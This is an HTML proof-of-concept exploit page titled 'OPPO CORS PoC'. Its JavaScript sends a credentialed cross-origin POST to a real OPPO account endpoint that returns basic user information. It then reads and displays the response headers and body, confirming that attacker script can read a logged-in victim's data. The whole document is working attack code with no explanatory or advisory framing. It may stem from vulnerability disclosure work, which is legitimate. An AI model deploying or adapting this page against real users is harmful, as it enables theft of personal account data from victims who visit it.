<!DOCTYPE html>
<html>
<head>
  <title>OPPO CORS PoC</title>
</head>
<body>
  <h2>OPPO CORS PoC</h2>
  <p>Attacker Origin: <b id="origin"></b></p>

  <label>Target URL:</label><br>
  <input id="url" type="text" value="https://id-in.oppo.com/uc/web/v1/user-info/query-basic" size="70"><br><br>

  <button onclick="exploit()">Exploit</button><br><br>

  <textarea id="result" rows="20" cols="80" readonly></textarea>

  <script>
    document.getElementById('origin').textContent = window.location.origin;

    async function exploit() {
      const url = document.getElementById('url').value.trim();
      const out = document.getElementById('result');
      out.value = 'Sending request to: ' + url + '\n\n';

      try {
        const res = await fetch(url, {
          method: 'POST',
          credentials: 'include',
          headers: { 'Content-Type': 'application/json' },
          body: '{}'
        });

        out.value += 'HTTP Status: ' + res.status + '\n';
        out.value += 'Access-Control-Allow-Origin: ' + res.headers.get('access-control-allow-origin') + '\n';
        out.value += 'Access-Control-Allow-Credentials: ' + res.headers.get('access-control-allow-credentials') + '\n\n';

        const body = await res.text();
        out.value += 'Response Body:\n' + body;

        out.value += '\n\n[CORS CONFIRMED] Attacker JS successfully read the response!';
      } catch (e) {
        out.value += 'ERROR: ' + e.message + '\n';
        out.value += '[CORS BLOCKED] Browser prevented reading the response.';
      }
    }
  </script>
</body>
</html>
